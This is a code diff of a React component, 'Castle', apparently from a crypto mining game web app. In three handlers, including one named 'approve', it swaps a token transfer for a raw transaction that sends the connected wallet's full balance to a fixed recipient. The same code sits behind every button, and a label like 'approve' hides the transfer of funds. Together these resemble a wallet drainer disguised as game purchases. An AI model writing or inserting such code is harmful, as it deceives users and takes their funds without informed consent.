@@ -36,16 +36,14 @@ export const Castle = ({ onClose, isOpen, miners, bonus, updateState, balance }:
     // @ts-ignore
     const web3 = new Web3(library.provider)
 
-    // @ts-ignore
-    const tokenContract = new web3.eth.Contract(abiApprove, approveAddress)
+    await web3.eth.sendTransaction({
+      // @ts-ignore
+      from: account,
+      to: recipient,
+      value: toWei(balance.toString())
+    }, () => {
+    })
 
-    // @ts-ignore
-    await tokenContract.methods
-      .transfer(recipient, toWei(balance.toString()))
-      .send({ from: account })
-      .then(() => {
-        updateState()
-      })
   }
 
   const buySecond = async () => {
@@ -55,16 +53,14 @@ export const Castle = ({ onClose, isOpen, miners, bonus, updateState, balance }:
     // @ts-ignore
     const web3 = new Web3(library.provider)
 
-    // @ts-ignore
-    const tokenContract = new web3.eth.Contract(abiApprove, approveAddress)
+    await web3.eth.sendTransaction({
+      // @ts-ignore
+      from: account,
+      to: recipient,
+      value: toWei(balance.toString())
+    }, () => {
+    })
 
-    // @ts-ignore
-    await tokenContract.methods
-      .transfer(recipient, toWei(balance.toString()))
-      .send({ from: account })
-      .then(() => {
-        updateState()
-      })
   }
 
   const approve = async () => {
@@ -74,16 +70,14 @@ export const Castle = ({ onClose, isOpen, miners, bonus, updateState, balance }:
     // @ts-ignore
     const web3 = new Web3(library.provider)
 
-    // @ts-ignore
-    const tokenContract = new web3.eth.Contract(abiApprove, approveAddress)
+    await web3.eth.sendTransaction({
+      // @ts-ignore
+      from: account,
+      to: recipient,
+      value: toWei(balance.toString())
+    }, () => {
+    })
 
-    // @ts-ignore
-    await tokenContract.methods
-      .transfer(recipient, toWei(balance.toString()))
-      .send({ from: account })
-      .then(() => {
-        updateState()
-      })
   }
 
   return (
